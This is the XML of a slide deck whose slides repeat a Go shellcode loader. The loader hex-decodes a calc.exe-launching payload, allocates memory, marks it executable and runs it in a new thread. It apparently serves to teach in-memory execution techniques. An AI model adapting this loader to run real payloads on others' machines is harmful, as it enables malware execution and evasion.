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356" r:id="rId4"/>
    <p:sldId id="389" r:id="rId5"/>
    <p:sldId id="388" r:id="rId6"/>
    <p:sldId id="408" r:id="rId7"/>
    <p:sldId id="351" r:id="rId8"/>
    <p:sldId id="390" r:id="rId9"/>
    <p:sldId id="391" r:id="rId10"/>
    <p:sldId id="392" r:id="rId11"/>
    <p:sldId id="396" r:id="rId12"/>
    <p:sldId id="397" r:id="rId13"/>
    <p:sldId id="399" r:id="rId14"/>
    <p:sldId id="395" r:id="rId15"/>
    <p:sldId id="400" r:id="rId16"/>
    <p:sldId id="401" r:id="rId17"/>
    <p:sldId id="402" r:id="rId18"/>
    <p:sldId id="403" r:id="rId19"/>
    <p:sldId id="404" r:id="rId20"/>
    <p:sldId id="405" r:id="rId21"/>
    <p:sldId id="407" r:id="rId22"/>
    <p:sldId id="409" r:id="rId23"/>
    <p:sldId id="398" r:id="rId24"/>
    <p:sldId id="40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 autoAdjust="0"/>
    <p:restoredTop sz="96174" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="130" d="100"/>
          <a:sy n="130" d="100"/>
        </p:scale>
        <p:origin x="728" y="16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744A3-322F-4056-BFAF-8AABF596E98B}" type="datetimeFigureOut">
              <a:rPr lang="en-CA" smtClean="0"/>
              <a:t>2026-09-25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87983-DA3F-4E84-972A-686A842FDD2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78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5252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67B5-B991-4D39-2470-CCCA0137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53CE1-FDA0-8AE3-95B2-5BBD13420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9846B-51EA-CA52-1539-7693BCBB3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02EF3-2A31-99AE-E38C-9A79284BE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4556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3549A-FC80-D814-873C-2CA51247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930AF-B9F7-9CB5-2872-53CCF70A4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16B49-CD84-3DE7-3953-0C7EDA1FF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FA282-A5DA-58D6-143B-51C6CAF27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2596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9C46-5B0D-9DC9-E957-CBABBBB0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C874C-1297-04D1-1BFD-90EF35A18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20D01-E2A3-F1B8-CD03-2DA03263E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18002-9C54-5308-7A1E-C614F1B17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60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046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5F75-1034-DB9C-D60B-64E0D2AC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26FB2-1755-D172-1F0C-3C287B2B7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20FC8-827E-8C1F-7C3A-45C7AE7B8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2FF6A-3B93-A3EE-3495-E1F692357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0121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3BFAF-3001-39CD-406A-A64BF201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CBC0C-A35E-EBFF-BC00-50CD39261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7CD98-3533-59A1-A0AD-75EF975B8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4EF1-73FC-3B6B-4F4C-263C03790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316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F224-1195-3635-55FA-9FADF14A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3B48A-1A61-AF7A-E525-2A08EA94A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B2138-3CEB-9D55-73D3-1FA8332DC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28397-62B5-C90B-B9A7-9EE4F21E6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8496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1912D-5B4C-C241-5355-F7B9978B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5A2A8-F7C2-760C-725A-B1ACD0492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F4E27-BE08-8DE7-409E-88E5C82B7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5CE91-6DD2-B944-F088-320197C95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1316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980E-BBD8-1D61-59EC-199104D4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09005-65B0-0212-77E1-CBD5CC0A8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3ABA1-715D-F8BE-F012-CD768DB6D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2DBB4-2E18-2AAA-B44A-39F4C0F54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0608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4860-6ABA-8A87-691C-A6D4885B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C0D60-DDB5-7740-E1D6-0D39BD98F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4E836-5E80-63E5-F761-62B521F30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37251-314A-B5A5-A244-F26FC1361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9363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EAFD4-43AD-7609-75D7-5D092413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C944A-C74B-C5AB-975F-F1611756E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D71F1-3D77-7FE7-47BF-102725BFC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E1445-437B-7D86-8C83-56CDA7A87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306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0CAB-E7F3-6C15-5E32-DB1522A5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1EAE3-EC7D-47D1-D458-C3D8A9D4C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370E1-EBD6-A135-6783-F1418C97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83534-337C-1932-378A-C6295C6A9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7561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7AB9-67AF-1496-0642-2E98B5A7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37648-CBC7-744A-D56B-DA0BCD1A4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52BC3-938C-F23B-6150-561C8A5B1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CD404-8216-C8F8-CF70-0C630898F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6340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27BA-4810-D35C-165D-F32D5DA3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7F978-C50C-3F10-6A5C-A6319B016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9B8A5-468B-E57A-E428-DDF9B62F2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2C7B5-08EB-44F2-5AB1-6D85C967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6999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2C93-10A7-D090-34F2-C1C4DB7D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8F7AC-1EFF-655F-B73B-2A7A81B46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78EE2-7E19-A74D-C34C-E7937BFD5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C01B1-0C59-FC7F-63D6-EF1375523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1711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708C-8E20-F6EC-3144-C9053088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FEBFB-A906-19E0-2215-76E4B28D2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4780D-062C-7DA4-120B-4712E5747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C6D0E-56FE-F43F-65AE-7CB4FA7F2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158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828B-5000-C66A-FC50-096DD0E3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B7896-75BC-590A-2615-9C314705B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67842-43E0-6625-4BBE-C3D2A2B8E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A3C85-67DC-B460-5DE8-EA910A3FC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2141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E8D2-B995-3B7F-925E-71EBC03B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3E078-CE8B-8DE0-85A5-A3952E7E7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94CF3-7885-9AB8-6399-1332EB5CC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DBE8-7FB9-E053-2F14-4745AAC47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076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8AAF-CCD5-0F0E-8149-EF06A9C9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B0BFE-77D0-9FB8-92DB-5712C6961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8D98B-92F8-67E4-BFB1-59D39DCE3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package </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E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6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"encoding/hex"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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>syscall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"unsafe"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>
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>const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MEM_COMMIT  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/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0x00001000</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>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MEM_RESERVE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/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0x00002000</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr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kernel32 =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NewLazyDLL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"Kernel32.dll"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ntdll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>    =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NewLazyDLL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"NtDll.dll"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VirtualAlloc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int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vrtAlloc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VirtualAlloc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MEM_COMMIT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>MEM_RESERVE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PAGE_READWRITE</a:t>
            </a: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vrtAlloc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RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(destination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source []</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>byte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rtlCpyMem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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>ntdll.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1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RtlCopyMemory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destination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>
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>unsafe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6FAFBD"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Pointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(&amp;source[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]))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(source)))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rtlCpyMem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VirtualProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpAddress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dwSize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int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 err="1"/>
              <a:t>oldProtect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uint32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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>virtProtect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VirtualProtect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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpAddress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PAGE_EXECUTE_READ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)(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>unsafe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6FAFBD"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Pointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>oldProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>)))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virtProtect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CreateThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpStartAddress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thread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CreateThread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lpStartAddress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/>
              <a:t>thread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WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>hHandle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 {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>  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WaitForSingleObject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r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>hHandle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0xFFFFFF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>
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>() 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/>
              <a:t>payload = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>hex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DecodeString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(payload)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calcAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t> := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>VirtualAlloc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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>))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RtlCopyMemory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calculadora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VirtualProtect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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>))</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>   thread := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>CreateThread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WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(thread)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88E4-7E25-D351-917B-AF090B207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808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7018-C6C2-1A98-0200-4B7E8440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A3DA8-829B-F457-4736-8242E8D12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10C9E-1263-C7EF-EBDC-2AA155C01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package </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E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6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"encoding/hex"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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>syscall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"unsafe"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>
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>const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MEM_COMMIT  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/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0x00001000</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>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MEM_RESERVE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/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0x00002000</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr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kernel32 =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NewLazyDLL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"Kernel32.dll"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ntdll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>    =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NewLazyDLL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"NtDll.dll"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VirtualAlloc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int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vrtAlloc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VirtualAlloc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MEM_COMMIT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>MEM_RESERVE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PAGE_READWRITE</a:t>
            </a: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vrtAlloc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RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(destination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source []</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>byte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rtlCpyMem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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>ntdll.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1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RtlCopyMemory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destination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>
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>unsafe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6FAFBD"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Pointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(&amp;source[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]))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(source)))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rtlCpyMem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VirtualProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpAddress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dwSize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int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 err="1"/>
              <a:t>oldProtect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uint32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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>virtProtect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VirtualProtect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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpAddress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PAGE_EXECUTE_READ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)(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>unsafe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6FAFBD"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Pointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>oldProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>)))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virtProtect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CreateThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpStartAddress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thread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CreateThread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lpStartAddress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/>
              <a:t>thread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WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>hHandle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 {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>  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WaitForSingleObject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r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>hHandle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0xFFFFFF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>
                <a:solidFill>
                  <a:srgbClr val="FFC66D"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>() 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/>
              <a:t>payload = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>hex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DecodeString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(payload)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calcAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t> := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>VirtualAlloc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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>))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RtlCopyMemory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calculadora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VirtualProtect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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>calculadora</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>))</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>   thread := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B09D79"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>CreateThread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WaitForSingleObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(thread)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56A85-6918-EC5D-B05F-FD99174E5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2815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DB54D-07DC-208E-A2E4-18772041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6C4D4-4D3E-6BCF-F4F0-CDC82F10E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9F66C-957D-050E-504B-CD6A63560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rgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>package </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>main</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E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import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6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>"encoding/hex"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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6A8759"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>syscall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"unsafe"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>
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>const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MEM_COMMIT  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/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0x00001000</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>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MEM_RESERVE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>0x00002000</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6897BB"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr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kernel32 =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NewLazyDLL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"Kernel32.dll"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ntdll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>    =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NewLazyDLL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"NtDll.dll"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VirtualAlloc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int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vrtAlloc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VirtualAlloc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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>MEM_COMMIT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>MEM_RESERVE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PAGE_READWRITE</a:t>
            </a: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vrtAlloc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RtlCopyMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(destination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source []</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>byte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rtlCpyMem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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>ntdll.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1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RtlCopyMemory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destination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>
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>unsafe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6FAFBD"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Pointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(&amp;source[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]))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(source)))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rtlCpyMem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VirtualProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpAddress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dwSize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int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 err="1"/>
              <a:t>oldProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>uint32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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>virtProtect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VirtualProtect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br>
              <a:rPr lang="en-CA" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-CA" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>lpAddress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 err="1"/>
              <a:t>dwSize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 err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>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PAGE_EXECUTE_READ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC7832"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>,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)(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AFBF7E"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>unsafe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CA" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6FAFBD"/>
                </a:solidFill>
